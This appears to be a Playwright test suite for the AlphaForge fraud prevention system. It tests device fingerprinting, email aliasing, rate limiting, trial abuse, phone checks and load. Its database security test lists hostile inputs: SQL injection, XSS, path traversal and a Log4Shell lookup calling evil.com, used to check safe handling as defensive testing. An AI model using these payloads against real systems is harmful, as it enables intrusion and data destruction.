// Comprehensive Fraud Prevention Test Suite
// Tests all layers of the AlphaForge fraud prevention system

import { test, expect } from '@playwright/test';
import FraudTestHelper from '../utils/fraud-test-helper.js';

test.describe('AlphaForge Fraud Prevention System @fraud @security', () => {
  let fraudHelper;
  
  test.beforeEach(async ({ page }) => {
    fraudHelper = new FraudTestHelper();
    // Navigate to the quantum assistant page
    await page.goto('/quantum-assistant');
  });

  test.afterEach(async () => {
    fraudHelper.clearTestData();
  });

  test.describe('Device Fingerprinting @device', () => {
    test('should detect multiple accounts from same device', async () => {
      // Create first account - should succeed
      const account1 = await fraudHelper.createLegitimateUser({
        email: 'user1@example.com'
      });
      expect(account1.success).toBe(true);
      expect(account1.riskScore).toBeLessThan(30);

      // Attempt second account from same device - should be flagged
      const account2 = await fraudHelper.createAccount({
        email: 'user2@example.com'
      });
      
      // Second account should have higher risk score
      expect(account2.riskScore).toBeGreaterThan(40);
    });

    test('should handle legitimate users with similar fingerprints', async () => {
      // Simulate corporate environment with similar devices
      const corporateUsers = await Promise.all([
        fraudHelper.createLegitimateUser({ email: 'john@company.com' }),
        fraudHelper.createLegitimateUser({ email: 'jane@company.com' }),
        fraudHelper.createLegitimateUser({ email: 'bob@company.com' })
      ]);

      // All should succeed with reasonable risk scores
      corporateUsers.forEach(user => {
        expect(user.success).toBe(true);
        expect(user.riskScore).toBeLessThan(50); // Allow higher scores for corporate environments
      });
    });
  });

  test.describe('Email Fraud Detection @email', () => {
    test('should detect email aliasing attempts', async () => {
      const result = await fraudHelper.simulateFraudulentAttempt('email_aliasing', {
        baseEmail: 'fraudster@gmail.com'
      });

      expect(result.attackType).toBe('email_aliasing');
      expect(result.blocked).toBeGreaterThan(0);
      expect(result.results.some(r => r.riskScore > 50)).toBe(true);
    });

    test('should reject disposable email addresses', async () => {
      const result = await fraudHelper.simulateFraudulentAttempt('disposable_email');
      
      expect(result.blocked).toBeGreaterThan(0);
      result.results.forEach(attempt => {
        expect(attempt.riskScore).toBeGreaterThan(40);
      });
    });

    test('should validate legitimate email addresses', async () => {
      const legitimateEmails = [
        'user@company.com',
        'professional@business.org',
        'trader@finance.net'
      ];

      for (const email of legitimateEmails) {
        const validation = await fraudHelper.validateEmail(email);
        expect(validation.valid).toBe(true);
        expect(validation.riskScore).toBeLessThan(30);
      }
    });
  });

  test.describe('Rate Limiting Protection @rate-limiting', () => {
    test('should block rapid messaging attempts', async ({ page }) => {
      // Get to the chat interface
      await page.waitForSelector('[data-testid="chat-input"]');
      
      const result = await fraudHelper.simulateFraudulentAttempt('bot_behavior', {
        messageCount: 15,
        delay: 100 // Very rapid messaging
      });

      expect(result.rateLimited).toBe(true);
      expect(result.messagesSent).toBeLessThan(15); // Should be stopped before 15 messages
    });

    test('should allow normal human messaging pace', async () => {
      // Simulate human-like messaging with normal delays
      const sessionResponse = await fraudHelper.createAccount();
      
      const messages = [];
      for (let i = 0; i < 5; i++) {
        const result = await fraudHelper.sendMessage(
          sessionResponse.sessionId, 
          `Human message ${i}`
        );
        messages.push(result);
        await fraudHelper.delay(fraudHelper.randomDelay(2000, 5000)); // Human-like delays
      }

      messages.forEach(message => {
        expect(message.success).toBe(true);
        expect(message.rateLimited).toBe(false);
      });
    });
  });

  test.describe('Trial Abuse Prevention @trial-abuse', () => {
    test('should prevent rapid account creation from same source', async () => {
      const result = await fraudHelper.simulateFraudulentAttempt('rapid_creation', {
        count: 8,
        timeWindow: 30000 // 30 seconds
      });

      expect(result.blocked).toBeGreaterThan(0);
      
      // Later attempts should have higher risk scores
      const sortedResults = result.results.sort((a, b) => a.attemptNumber - b.attemptNumber);
      const earlyAttempts = sortedResults.slice(0, 3);
      const laterAttempts = sortedResults.slice(-3);
      
      const avgEarlyRisk = earlyAttempts.reduce((sum, r) => sum + (r.riskScore || 0), 0) / earlyAttempts.length;
      const avgLaterRisk = laterAttempts.reduce((sum, r) => sum + (r.riskScore || 0), 0) / laterAttempts.length;
      
      expect(avgLaterRisk).toBeGreaterThan(avgEarlyRisk);
    });

    test('should track trial eligibility across sessions', async () => {
      // Create first trial account
      const firstTrial = await fraudHelper.createLegitimateUser({
        email: 'first@example.com'
      });
      expect(firstTrial.success).toBe(true);

      // Attempt second trial from same device/IP - should be restricted
      const secondTrial = await fraudHelper.createAccount({
        email: 'second@example.com'
      });
      
      expect(secondTrial.riskScore).toBeGreaterThan(40);
    });
  });

  test.describe('Phone Verification Security @phone', () => {
    test('should detect virtual phone numbers', async () => {
      const virtualNumbers = [
        '+15550000000', // Common test number
        '+15551234567', // Sequential pattern
        '+12125551234'  // Known VoIP range
      ];

      for (const phone of virtualNumbers) {
        const result = await fraudHelper.createAccount({ phone });
        expect(result.riskScore).toBeGreaterThan(30);
      }
    });

    test('should accept legitimate phone numbers', async () => {
      const legitimateNumbers = [
        '+12025551234', // Washington DC
        '+13125551234', // Chicago
        '+14155551234'  // San Francisco
      ];

      for (const phone of legitimateNumbers) {
        const result = await fraudHelper.createAccount({ phone });
        expect(result.success).toBe(true);
        expect(result.riskScore).toBeLessThan(40);
      }
    });

    test('should prevent phone number reuse', async () => {
      const phoneNumber = '+15551112233';
      
      // First use should succeed
      const first = await fraudHelper.createAccount({ phone: phoneNumber });
      expect(first.success).toBe(true);
      
      // Second use should be flagged
      const second = await fraudHelper.createAccount({ 
        phone: phoneNumber,
        email: 'different@example.com'
      });
      expect(second.riskScore).toBeGreaterThan(50);
    });
  });

  test.describe('Integration Testing @integration', () => {
    test('should handle complex fraud scenario', async () => {
      // Multi-vector attack: email aliasing + rapid creation + suspicious behavior
      const baseEmail = 'attacker@gmail.com';
      const aliases = [
        `${baseEmail.split('@')[0]}+1@${baseEmail.split('@')[1]}`,
        `${baseEmail.split('@')[0]}+2@${baseEmail.split('@')[1]}`,
        `${baseEmail.split('@')[0]}+3@${baseEmail.split('@')[1]}`
      ];

      const results = [];
      for (const alias of aliases) {
        const result = await fraudHelper.createAccount({ email: alias });
        results.push(result);
        await fraudHelper.delay(500); // Rapid creation
      }

      // At least some attempts should be blocked or highly flagged
      const highRiskAttempts = results.filter(r => r.riskScore > 60);
      expect(highRiskAttempts.length).toBeGreaterThan(0);
    });

    test('should maintain good user experience for legitimate users', async () => {
      // Simulate legitimate user journey
      const user = await fraudHelper.createLegitimateUser({
        name: 'John Trader',
        email: 'john.trader@finance.com',
        role: 'portfolio_manager',
        tradingExperience: 'advanced',
        company: 'Financial Corp',
        phone: '+12125551234'
      });

      expect(user.success).toBe(true);
      expect(user.riskScore).toBeLessThan(30);
      expect(user.isBlocked).toBe(false);
    });
  });

  test.describe('Performance Under Attack @performance', () => {
    test('should maintain performance during attack simulation', async () => {
      const startTime = Date.now();
      
      // Simulate coordinated attack
      const attackPromises = Array(10).fill().map((_, i) => 
        fraudHelper.simulateFraudulentAttempt('rapid_creation', {
          count: 5,
          timeWindow: 10000
        })
      );

      const results = await Promise.all(attackPromises);
      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // Should complete within reasonable time (30 seconds)
      expect(totalTime).toBeLessThan(30000);
      
      // Should block most fraudulent attempts
      const totalAttempts = results.reduce((sum, r) => sum + r.attempts, 0);
      const totalBlocked = results.reduce((sum, r) => sum + r.blocked, 0);
      const blockRate = totalBlocked / totalAttempts;
      
      expect(blockRate).toBeGreaterThan(0.3); // At least 30% blocked
    });

    test('should handle high legitimate traffic', async () => {
      const loadTestResult = await fraudHelper.loadTest({
        concurrent: 5,
        duration: 10000, // 10 seconds
        requestsPerSecond: 2
      });

      expect(loadTestResult.successfulRequests).toBeGreaterThan(0);
      expect(loadTestResult.averageResponseTime).toBeLessThan(2000); // Under 2 seconds
      
      // Should maintain high success rate
      const successRate = loadTestResult.successfulRequests / loadTestResult.totalRequests;
      expect(successRate).toBeGreaterThan(0.9); // 90% success rate
    });
  });

  test.describe('Database Security @database', () => {
    test('should handle malicious input safely', async () => {
      const maliciousInputs = [
        "'; DROP TABLE fraud_prevention; --",
        "admin' OR '1'='1",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
      ];

      for (const maliciousInput of maliciousInputs) {
        const result = await fraudHelper.createAccount({ 
          name: maliciousInput,
          email: `test${Date.now()}@example.com`
        });
        
        // Should either succeed safely or fail gracefully
        if (!result.success) {
          expect(result.error).toBeDefined();
          expect(result.error).not.toContain('database');
          expect(result.error).not.toContain('SQL');
        }
      }
    });

    test('should log fraud attempts properly', async () => {
      const testSummary = fraudHelper.getTestSummary();
      expect(testSummary).toBeDefined();
      expect(testSummary.timestamp).toBeDefined();
    });
  });
});

// Admin functionality tests
test.describe('Admin Fraud Monitoring @admin', () => {
  let fraudHelper;
  
  test.beforeEach(async () => {
    fraudHelper = new FraudTestHelper();
  });

  test('should generate fraud reports', async () => {
    // Create some test data
    await fraudHelper.simulateFraudulentAttempt('email_aliasing');
    await fraudHelper.createLegitimateUser();
    
    const summary = fraudHelper.getTestSummary();
    expect(summary.legitimateUsers).toBeGreaterThan(0);
    expect(summary.fraudulentAttempts).toBeGreaterThan(0);
  });
});